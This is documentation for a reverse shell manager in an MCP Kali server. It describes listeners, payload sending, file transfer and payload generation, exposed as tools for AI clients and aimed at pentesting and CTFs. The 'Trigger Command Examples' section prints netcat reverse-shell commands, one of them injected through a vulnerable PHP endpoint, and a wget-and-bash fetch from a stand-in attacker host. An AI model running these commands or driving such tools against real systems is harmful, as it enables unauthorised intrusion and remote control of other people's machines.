# Reverse Shell Manager Documentation

The Reverse Shell Manager is a core component of the MCP Kali Server that provides comprehensive reverse shell session management capabilities. This document explains the architecture, functionality, and usage patterns of the system.

## 🏗️ Architecture Overview

The Reverse Shell Manager follows a multi-layered architecture designed for scalability, security, and ease of use:

```mermaid
flowchart TB
    subgraph "Client Layer"
        MCP[MCP Client]
        API[REST API Client]
    end
    
    subgraph "MCP Layer"
        MCPS[MCP Server<br/>mcp_server.py]
    end
    
    subgraph "API Layer"
        Routes[API Routes<br/>routes.py]
    end
    
    subgraph "Core Layer"
        RSM[Reverse Shell Manager<br/>reverse_shell_manager.py]
    end
    
    subgraph "System Layer"
        Processes[System Processes]
        Network[Network Sockets]
        PTY[PTY File Descriptors]
    end
    
    MCP -->|MCP Protocol| MCPS
    MCPS -->|HTTP Requests| Routes
    API -->|HTTP Requests| Routes
    Routes -->|Function Calls| RSM
    RSM -->|Process Management| Processes
    RSM -->|Socket Management| Network
    RSM -->|Terminal Management| PTY
    
    style RSM fill:#e1f5fe
    style Routes fill:#f3e5f5
    style MCPS fill:#fff3e0
    style MCP fill:#e8f5e8
    style API fill:#e8f5e8
```

**Architecture Notes:**
- **MCP Clients**: Connect through the dedicated MCP Server (`mcp-server/mcp_server.py`) which acts as a protocol translator, converting MCP calls to HTTP requests
- **Direct API Clients**: Can connect directly to the REST API endpoints without going through the MCP layer
- **Both paths**: Eventually reach the same Reverse Shell Manager core functionality through the API routes

## 📡 MCP Integration

All reverse shell functionality is fully available through the Model Context Protocol (MCP) interface. The MCP server provides seamless access to all operations:

### Available MCP Tools

```mermaid
flowchart LR
    subgraph "MCP Tools"
        T1[reverse_shell_listener_start]
        T2[reverse_shell_command]
        T3[reverse_shell_status]
        T4[reverse_shell_stop]
        T5[reverse_shell_sessions]
        T6[reverse_shell_send_payload]
        T7[reverse_shell_upload_content]
        T8[reverse_shell_download_content]
        T9[reverse_shell_generate_payload]
    end
    
    subgraph "API Endpoints"
        A1["POST /api/reverse-shell/listener/start"]
        A2["POST /api/reverse-shell/{id}/command"]
        A3["GET /api/reverse-shell/{id}/status"]
        A4["POST /api/reverse-shell/{id}/stop"]
        A5["GET /api/reverse-shell/sessions"]
        A6["POST /api/reverse-shell/{id}/send-payload"]
        A7["POST /api/reverse-shell/{id}/upload-content"]
        A8["POST /api/reverse-shell/{id}/download-content"]
        A9["POST /api/reverse-shell/generate-payload"]
    end
    
    T1 --> A1
    T2 --> A2
    T3 --> A3
    T4 --> A4
    T5 --> A5
    T6 --> A6
    T7 --> A7
    T8 --> A8
    T9 --> A9

```

## 🔄 Session Lifecycle Management

The Reverse Shell Manager handles complete session lifecycles from creation to termination:

```mermaid
stateDiagram-v2
    [*] --> Initialized : Create Session
    Initialized --> Listening : Start Listener
    Listening --> Connected : Incoming Connection
    Listening --> Triggering : Trigger Action
    Triggering --> Connected : Successful Connection
    Triggering --> Listening : Failed Connection
    Connected --> Executing : Execute Command
    Executing --> Connected : Command Complete
    Connected --> Disconnected : Connection Lost
    Disconnected --> Listening : Reconnect Possible
    Listening --> Terminated : Stop Session
    Connected --> Terminated : Stop Session
    Triggering --> Terminated : Stop Session
    Disconnected --> Terminated : Stop Session
    Terminated --> [*]
    
    note right of Listening
        Non-blocking listener
        using subprocess.Popen
        in daemon thread
    end note
    
    note right of Triggering
        NEW: Non-blocking trigger
        execution prevents
        server blocking
    end note
    
    note right of Connected
        PTY-based communication
        for interactive shell
        sessions
    end note
```

## 🛠️ Core Components

### 1. Session Management

Each reverse shell session is managed as an independent entity with the following attributes:

```mermaid
classDiagram
    class Session {
        +string session_id
        +int port
        +string listener_type
        +datetime start_time
        +boolean is_connected
        +Process listener_process
        +Thread listener_thread
        +Process trigger_process
        +Thread trigger_thread
        +PTY master_fd
        +PTY slave_fd
        +dict session_info
        
        +start_listener()
        +execute_command()
        +send_payload()
        +get_status()
        +stop_session()
    }
    
    Session --> Process : manages
    Session --> Thread : runs in
    Session --> PTY : communicates via
```

### 2. Listener Types

The system supports two main listener implementations:

```mermaid
flowchart LR
    subgraph "Supported Listener Types"
        NC[Netcat<br/>nc -nvlp]
        PWN[Pwncat<br/>pwncat -l / pwncat --listen<br/><i>Falls back to netcat if unavailable</i>]
    end
    
    subgraph "Common Features"
        PTY[PTY Support]
        LOG[Session Logging]
        CMD[Command Execution]
        CLEAN[Automatic Cleanup]
    end
    
    NC --> PTY
    PWN --> PTY
    
    PTY --> LOG
    PTY --> CMD
    PTY --> CLEAN
    
    style PWN fill:#e8f5e8
    style NC fill:#fff3e0
```

## 🚀 Trigger System (New Feature)

The trigger system allows non-blocking execution of commands that establish reverse shell connections:

```mermaid
sequenceDiagram
    participant Client
    participant API
    participant Manager
    participant PayloadThread
    participant TargetSystem
    
    Client->>+API: POST /api/reverse-shell/{id}/send-payload
    API->>+Manager: send_payload(command)
    Manager->>Manager: Validate session exists
    Manager->>+PayloadThread: Start daemon thread
    PayloadThread->>Manager: Thread started
    Manager-->>-API: Immediate response
    API-->>-Client: Success (non-blocking)
    
    par Background Execution
        PayloadThread->>+TargetSystem: Execute payload command
        Note over PayloadThread,TargetSystem: curl, wget, or custom command
        TargetSystem->>TargetSystem: Process payload
        TargetSystem->>Manager: Establish reverse connection
        PayloadThread-->>-Manager: Command completed
    end
    
    Note over Manager: Session state updated<br/>when connection received
```

### Trigger Command Examples

```bash
# Web-based trigger (common in CTFs and pentesting)
curl -X POST http://target.com/vulnerable.php \
  -d "command=nc attacker_ip 4444 -e /bin/bash"

# File-based trigger
wget http://attacker.com/reverse_shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh

# Direct command execution
ssh user@target.com "nc attacker_ip 4444 -e /bin/bash"
```

## 🔧 API Endpoints

The REST API provides comprehensive access to all reverse shell functionality:

```mermaid
flowchart TD
    subgraph "Session Management"
        START["POST /api/reverse-shell/listener/start<br/>Create & Start Session"]
        STOP["POST /api/reverse-shell/{id}/stop<br/>Terminate Session"]
        STATUS["GET /api/reverse-shell/{id}/status<br/>Get Session Info"]
        LIST["GET /api/reverse-shell/sessions<br/>List All Sessions"]
    end
    
    subgraph "Command Execution"
        CMD["POST /api/reverse-shell/{id}/command<br/>Execute Shell Command"]
        SEND_PAYLOAD["POST /api/reverse-shell/{id}/send-payload<br/>🆕 Send Payload"]
    end
    
    subgraph "File Operations"
        UPLOAD["POST /api/reverse-shell/{id}/upload-content<br/>Upload Content"]
        DOWNLOAD["POST /api/reverse-shell/{id}/download-content<br/>Download Content"]
    end
    
    subgraph "Payload Generation"
        PAYLOAD["POST /api/reverse-shell/generate-payload<br/>Generate Payloads"]
    end
    
    START --> STATUS
    STATUS --> CMD
    CMD --> UPLOAD
    CMD --> DOWNLOAD
    STATUS --> TRIGGER
    TRIGGER --> STATUS
    STATUS --> STOP
    LIST --> STATUS
    
    style TRIGGER fill:#e8f5e8
    style START fill:#fff3e0
    style CMD fill:#f3e5f5
```

## 💾 Data Flow Patterns

### Command Execution Flow

```mermaid
sequenceDiagram
    participant Client
    participant API
    participant Manager
    participant PTY
    participant Shell
    
    Client->>+API: Execute Command
    API->>+Manager: execute_command()
    Manager->>Manager: Validate session
    Manager->>+PTY: Write command
    PTY->>+Shell: Send to shell process
    Shell->>Shell: Execute command
    Shell-->>-PTY: Return output
    PTY-->>-Manager: Read output
    Manager->>Manager: Process & log output
    Manager-->>-API: Formatted response
    API-->>-Client: Command result
    
    Note over Manager,PTY: Handles timeouts<br/>and error conditions
```

### File Transfer Flow

```mermaid
flowchart TD
    subgraph "Upload Process"
        A1[Client Request] --> A2[Base64 Encode]
        A2 --> A3[Send via Shell]
        A3 --> A4[Decode on Target]
        A4 --> A5[Verify Integrity]
    end
    
    subgraph "Download Process"
        B1[Execute cat/base64] --> B2[Read Output]
        B2 --> B3[Decode Content]
        B3 --> B4[Verify Checksum]
        B4 --> B5[Return to Client]
    end
    
    subgraph "Error Handling"
        C1[Timeout Detection]
        C2[Corruption Detection]
        C3[Retry Logic]
        C4[Fallback Methods]
    end
    
    A5 --> C2
    B4 --> C2
    C2 --> C3
    C3 --> C4
    
    style A5 fill:#e8f5e8
    style B4 fill:#e8f5e8
    style C2 fill:#ffebee
```

## 🔒 Security Considerations

### Process Isolation

```mermaid
flowchart TB
    subgraph "Security Boundaries"
        subgraph "Session 1"
            S1P[Process 1]
            S1T[Thread 1]
            S1PTY[PTY Pair 1]
        end
        
        subgraph "Session 2"
            S2P[Process 2]
            S2T[Thread 2]
            S2PTY[PTY Pair 2]
        end
        
        subgraph "Session N"
            SNP[Process N]
            SNT[Thread N]
            SNPTY[PTY Pair N]
        end
    end
    
    subgraph "Shared Resources"
        MGR[Session Manager]
        LOG[Logging System]
        API[API Layer]
    end
    
    S1P -.-> MGR
    S2P -.-> MGR
    SNP -.-> MGR
    
    MGR --> LOG
    MGR --> API
    
    style MGR fill:#e1f5fe
    style LOG fill:#f3e5f5
    style API fill:#e8f5e8
```

### Session Cleanup and Resource Management

```mermaid
stateDiagram-v2
    [*] --> Active : Session Created
    
    state Active {
        [*] --> Listener
        [*] --> Connection
        [*] --> Trigger
        
        state "Resource Monitoring" as Monitor
        Listener --> Monitor : Health Check
        Connection --> Monitor : Health Check
        Trigger --> Monitor : Health Check
    }
    
    Active --> Cleanup : Stop Request
    Active --> Cleanup : Connection Lost
    Active --> Cleanup : Process Died
    Active --> Cleanup : Timeout
    
    state Cleanup {
        [*] --> StopProcesses
        StopProcesses --> ClosePTY
        ClosePTY --> CleanThreads
        CleanThreads --> RemoveSession
        RemoveSession --> [*]
    }
    
    Cleanup --> [*] : Resources Released
    
    note right of Monitor
        - Process health
        - Memory usage
        - Network state
        - PTY status
    end note
    
    note right of Cleanup
        - SIGTERM to processes
        - Close file descriptors
        - Join threads
        - Free memory
    end note
```

## 🧪 Testing and Validation

### Test Architecture

The reverse shell manager includes comprehensive testing using Docker containers:

```mermaid
flowchart TB
    subgraph "Test Environment"
        subgraph "Docker Container"
            SSH[SSH Server<br/>Port 2222]
            WEB[Web Server<br/>Port 8080]
            TOOLS[Testing Tools<br/>nc, bash, curl]
        end
        
        subgraph "Kali Server"
            RSM[Reverse Shell Manager]
            TESTS[Test Suite]
        end
    end
    
    subgraph "Test Scenarios"
        T1[Listener Creation]
        T2[Command Execution]
        T3[File Transfer]
        T4[🆕 Trigger Actions]
        T5[Session Cleanup]
        T6[Error Handling]
    end
    
    TESTS --> T1
    TESTS --> T2
    TESTS --> T3
    TESTS --> T4
    TESTS --> T5
    TESTS --> T6
    
    T1 --> RSM
    T2 --> RSM
    T3 --> RSM
    T4 --> RSM
    T5 --> RSM
    T6 --> RSM
    
    RSM <--> SSH
    RSM <--> WEB
    RSM <--> TOOLS
    
    style T4 fill:#e8f5e8
    style RSM fill:#e1f5fe
```

### Key Test Cases

1. **Non-blocking Trigger Test**: Validates that trigger actions return immediately (< 3 seconds)
2. **Session Isolation**: Ensures sessions don't interfere with each other
3. **Resource Cleanup**: Verifies proper cleanup of processes, threads, and file descriptors
4. **Error Recovery**: Tests handling of network failures, timeouts, and process crashes
5. **Concurrent Operations**: Validates multiple simultaneous sessions and operations


## 🔧 Configuration Options

### Session Configuration

```python
REVERSE_SHELL_CONFIG = {
    "default_listener_type": "pwncat",
    "default_port_range": (4444, 4500),
    "command_timeout": 30,
    "connection_timeout": 60,
    "max_sessions": 10,
    "cleanup_interval": 300,
    "log_commands": True,
    "auto_restart": False
}
```

### Listener Type Configuration

```python
LISTENER_CONFIGS = {
    "netcat": {
        "command": "nc -nvlp {port}",
        "connection_indicator": "Connection received"
    },
    "pwncat": {
        "command": ["pwncat -l {port}", "pwncat --listen {port}"],
        "fallback_to_netcat": True,
        "connection_indicator": "received connection"
    }
}
```

**Note**: The system only supports two listener types:
- **netcat** (`nc`): Standard netcat listener
- **pwncat**: Uses pwncat binary (not pwncat-cs), with automatic fallback to netcat if pwncat is not available

## 🚨 Troubleshooting Guide

### Common Issues and Solutions

```mermaid
flowchart TD
    subgraph "Common Issues"
        I1[Server Blocking on Trigger]
        I2[Connection Refused]
        I3[Command Timeouts]
        I4[Session Not Found]
        I5[File Transfer Failures]
    end
    
    subgraph "Solutions"
        S1[✅ Use send_payload API<br/>Non-blocking execution]
        S2[Check listener status<br/>Verify port availability]
        S3[Increase timeout values<br/>Check command validity]
        S4[Verify session ID<br/>Check session list]
        S5[Check file permissions<br/>Verify file encoding]
    end
    
    I1 --> S1
    I2 --> S2
    I3 --> S3
    I4 --> S4
    I5 --> S5
    
    style S1 fill:#e8f5e8
    style I1 fill:#ffebee
```

### Debug Commands

```bash
# Check session status
curl http://localhost:5000/api/reverse-shell/sessions

# Get detailed session info
curl http://localhost:5000/api/reverse-shell/{session_id}/status

# Test listener connectivity
nc -zv localhost {port}

# Monitor system resources
ps aux | grep python
netstat -tlnp | grep {port}
```

## 🔮 Future Enhancements

### Planned Features

```mermaid
mindmap
  root((Future Features))
    Session Persistence
      Database Storage
      Session Recovery
      State Restoration
    Advanced Payloads
      Encrypted Shells
      Multi-stage Payloads
      Custom Encoders
    Monitoring & Analytics
      Real-time Metrics
      Usage Statistics
      Performance Tracking
    Security Enhancements
      Session Encryption
      Access Control
      Audit Logging
```

### Roadmap

1. **Phase 1**: Enhanced error handling and retry logic
2. **Phase 2**: Session persistence and recovery mechanisms
3. **Phase 3**: Advanced payload generation and encoding
4. **Phase 4**: Real-time monitoring and analytics dashboard
5. **Phase 5**: Integration with additional penetration testing frameworks

---

## 📚 Related Documentation

- [STREAMING.md](STREAMING.md) - File transfer and streaming operations
- [TOOLS_SUMMARY.md](TOOLS_SUMMARY.md) - Overview of all available tools
- [README.md](../README.md) - Main project documentation
- [ARCHITECTURE.md](../ARCHITECTURE.md) - Overall system architecture

## 🤝 Contributing

When contributing to the Reverse Shell Manager:

1. **Follow Security Best Practices**: Always validate input and handle errors gracefully
2. **Add Comprehensive Tests**: Include both unit tests and integration tests
3. **Update Documentation**: Keep this document and code comments current
4. **Consider Performance**: Monitor resource usage and optimize where possible
5. **Maintain Compatibility**: Ensure changes don't break existing API contracts

For detailed contributing guidelines, see the main [README.md](../README.md) file.
